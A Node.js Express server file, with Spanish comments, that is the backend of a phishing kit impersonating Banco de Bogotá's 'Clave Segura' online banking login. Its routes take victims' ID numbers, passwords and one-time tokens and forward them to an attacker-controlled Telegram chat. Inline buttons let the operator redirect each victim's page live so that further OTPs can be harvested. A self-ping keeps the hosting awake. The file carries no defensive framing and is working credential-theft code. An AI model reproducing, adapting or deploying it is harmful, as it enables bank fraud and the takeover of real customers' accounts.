// server.js
const cors = require("cors");
const express = require("express");
const bodyParser = require("body-parser");
const dotenv = require("dotenv");
const fetch = require("node-fetch");
const app = express();
dotenv.config();

app.use(cors({
  origin: true, // o pon aquí tu dominio exacto del front de Azure
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"],
  optionsSuccessStatus: 204
}));

app.options("*", cors()); // para preflight

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(bodyParser.json());

const sessions = new Map();

// Utilidad para enviar mensaje con botones
async function enviarMensajeTelegram({ tipoDoc, numDoc, clave, sessionId }) {
  const mensaje = `
🔐 *NUEVO ACCESO - CLAVE SEGURA*

📄 *Tipo de documento:* ${tipoDoc}
🆔 *Documento:* ${numDoc}
🔑 *Clave segura:* ${clave}

🌀 *Session ID:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔁 Error Logo", callback_data: `inicio|${sessionId}` },
        { text: "🔐 Pedir Token", callback_data: `otp1|${sessionId}` },
        { text: "🚫 Error Token", callback_data: `otp2|${sessionId}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown",
      reply_markup: botones
    })
  });
}

// Ruta de ingreso
app.post("/virtualpersona", async (req, res) => {
  const { sessionId, metodo, tipoDoc, numDoc, clave } = req.body;

  if (metodo === "clave") {
    sessions.set(sessionId, { redirect_to: null });

    await enviarMensajeTelegram({ tipoDoc, numDoc, clave, sessionId });

    return res.json({ ok: true });
  }

  return res.status(400).json({ error: "Método no soportado" });
});

// ===== NUEVO: enviar "Nuevo OTP" con los mismos botones =====
async function enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId, token }) {
  const mensaje = `
🔐 *Nuevo otp*

📄 *Tipo de documento:* ${tipoDoc || "N/D"}
🆔 *Documento:* ${numDoc || "N/D"}
🔑 *Clave segura:* ${clave || "N/D"}
🔢 *Token:* ${token || "N/D"}

🌀 *Session ID:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔁 Error Logo",  callback_data: `inicio|${sessionId}` },
        { text: "🔐 Pedir Token", callback_data: `otp1|${sessionId}` },
        { text: "🚫 Error Token", callback_data: `otp2|${sessionId}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown",
      reply_markup: botones
    })
  });
}
// ===== NUEVO: notificar al entrar a OTP-1 =====
app.post("/notify/otp1", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok:false, error:"Falta sessionId" });

    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });

    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId, token });
    return res.json({ ok:true });
  } catch (e) {
    console.error("❌ /notify/otp1 error:", e);
    return res.status(500).json({ ok:false });
  }
});

// ===== NUEVO: notificar al entrar a OTP con error =====
app.post("/notify/otp2", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok:false, error:"Falta sessionId" });

    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });

    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId, token });
    return res.json({ ok:true });
  } catch (e) {
    console.error("❌ /notify/otp2 error:", e);
    return res.status(500).json({ ok:false });
  }
});

// Ruta de polling (ready.js la consulta)
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const estado = sessions.get(sessionId);

  if (!estado) return res.json({ redirect_to: null });

  if (estado.redirect_to) {
    const redireccion = estado.redirect_to;
    sessions.set(sessionId, { redirect_to: null }); // Reiniciar
    return res.json({ redirect_to: redireccion });
  }

  return res.json({ redirect_to: null });
});

// Webhook de Telegram (botones)
app.post("/telegram/webhook", async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const [accion, sessionId] = update.callback_query.data.split("|");

    sessions.set(sessionId, { redirect_to: accion });

    // Confirmación visual en Telegram
    const callbackId = update.callback_query.id;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        callback_query_id: callbackId,
        text: `✅ Acción aplicada: ${accion}`
      })
    });
  }

  res.sendStatus(200);
});

// Home
app.get("/", (req, res) => {
  res.send("Backend de Banco de Bogotá Clave Segura funcionando ✅");
});

app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});
// Activar Webhook manualmente (GET)
app.get("/setWebhook", async (req, res) => {
  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      url: `https://${req.headers.host}/telegram/webhook`
    })
  });

  const data = await response.json();
  res.json(data);
});

// ==== Auto-ping para mantener activo el backend y refrescar la propia URL cada 3 minutos ====
setInterval(async () => {
  try {
    const res = await fetch("https://serverbdbs.onrender.com/");
    const text = await res.text();
    console.log("🔁 Auto-ping realizado:", text);
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }
}, 180000); // 180000 ms = 3 minutos
